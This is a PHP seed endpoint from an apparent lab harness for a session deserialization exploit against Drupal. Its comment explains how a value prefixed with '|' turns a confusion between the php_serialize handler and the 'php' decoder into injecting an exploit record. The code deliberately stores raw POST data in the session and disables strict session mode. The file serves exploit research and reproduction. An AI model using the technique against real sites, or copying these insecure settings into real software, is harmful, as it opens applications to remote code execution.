<?php
/*
 * LAB-ONLY cleanup=On seed endpoint for the Drupal 115560 harness.
 *
 * The upload-progress dummy record is erased at MULTIPART_EVENT_END under
 * cleanup=On, so the concurrent consumer needs a persistent first record.
 * This endpoint starts the session under the configured php_serialize handler
 * (it does NOT switch handlers) and stores:
 *
 *     $_SESSION['seed_d'] = '|' . <valid a:1018 dummy>;
 *
 * Under php_serialize the file becomes
 *     a:1:{s:6:"seed_d";s:N:"|a:1018:{...}";}
 * The consumer's "php" decoder takes the bytes before the first "|" as an
 * ignored name, parses the a:1018 as record #1, then reaches the
 * upload-progress record's "|" and parses the exploit payload as record #2.
 *
 * The dummy is supplied raw in the multipart field "d" by
 * poc/verify_115560_drupal.py (same value the direct profile writes through
 * /vd_prime.php).  Fixed lab use only; no command interface.
 */
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['d']) ||
    !is_string($_POST['d'])) {
    http_response_code(400);
    echo "seed bad\n";
    exit;
}

@ini_set('session.use_cookies', '1');
@ini_set('session.use_only_cookies', '0');
@ini_set('session.use_strict_mode', '0');
session_start();

if (isset($_GET['clear'])) {
    $_SESSION = [];
    session_destroy();
    echo "seed cleared\n";
    exit;
}

$_SESSION['seed_d'] = '|' . $_POST['d'];
session_write_close();
echo "seed ok\n";
